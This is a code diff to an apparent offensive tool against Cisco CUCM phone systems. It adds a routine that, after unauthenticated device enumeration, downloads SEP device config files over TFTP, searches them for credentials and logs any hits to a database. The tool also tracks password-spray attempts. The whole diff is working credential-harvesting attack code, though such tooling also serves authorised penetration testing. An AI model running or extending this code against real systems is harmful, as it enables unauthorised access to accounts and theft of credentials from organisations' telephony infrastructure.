@@ -750,6 +750,23 @@ def enumerate_devices_unauthenticated(cucm_host, port, usernames, db_file, threa
     return found_count
 
 
+def download_uds_discovered_configs(cucm_host, device_names, db_file, use_tftp=True):
+    """
+    Download and parse SEP config files for devices discovered via UDS.
+    Logs any credentials found to the DB.
+    Returns the count of configs that yielded at least one credential.
+    """
+    hits = 0
+    for device_name in device_names:
+        filename = f'{device_name}.cnf.xml'
+        creds, users = search_for_secrets(cucm_host, filename, use_tftp=use_tftp)
+        if creds or users:
+            log_credentials_to_db(cucm_host, creds, users, db_file)
+        if creds:
+            hits += 1
+    return hits
+
+
 def is_user_rate_limited(username, db_file='thief.db', hours=1):
     """
     Return True iff `username` has any spray_attempts row within the last `hours`.
@@ -2053,7 +2070,17 @@ def main():
                     CUCM_host, args.uds_port, unique_users, db_file, threads=threads,
                 )
                 if found:
-                    print(f'[+] Found devices for {found} user(s) — see --show-db for details')
+                    print(f'[+] Found devices for {found} user(s) — attempting config downloads...')
+                    conn = sqlite3.connect(db_file)
+                    device_names = [r[0] for r in conn.execute(
+                        'SELECT DISTINCT device_name FROM uds_devices WHERE cucm_host = ?',
+                        (CUCM_host,),
+                    ).fetchall()]
+                    conn.close()
+                    hits = download_uds_discovered_configs(
+                        CUCM_host, device_names, db_file, use_tftp=use_tftp,
+                    )
+                    print(f'[+] Config download complete: {hits}/{len(device_names)} configs yielded credentials')
                 else:
                     print(f'[-] No device associations returned unauthenticated')
         else:
